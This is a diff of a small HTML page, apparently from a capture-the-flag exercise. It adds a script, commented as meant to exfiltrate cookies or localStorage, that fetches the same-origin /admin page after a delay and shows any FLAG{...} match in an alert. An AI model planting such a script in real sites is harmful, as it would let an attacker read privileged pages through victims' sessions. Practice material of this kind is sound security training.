@@ -1,9 +1,22 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Takeover</title>
+    <title>Hooked</title>
+    <script>
+      // Exfiltrate cookie, localStorage, or try fetch
+      setTimeout(() => {
+        fetch("/admin")
+          .then(res => res.text())
+          .then(data => {
+            const flag = data.match(/FLAG\{.*?\}/);
+            if (flag) alert("FLAG: " + flag[0]);
+            else alert("Admin page loaded, but no flag found");
+          })
+          .catch(e => alert("Error fetching /admin: " + e));
+      }, 1500);
+    </script>
   </head>
   <body>
-    <h1>✅ Auth bypassed — Look for your flag!</h1>
+    <h1>Waiting for session...</h1>
   </body>
 </html>
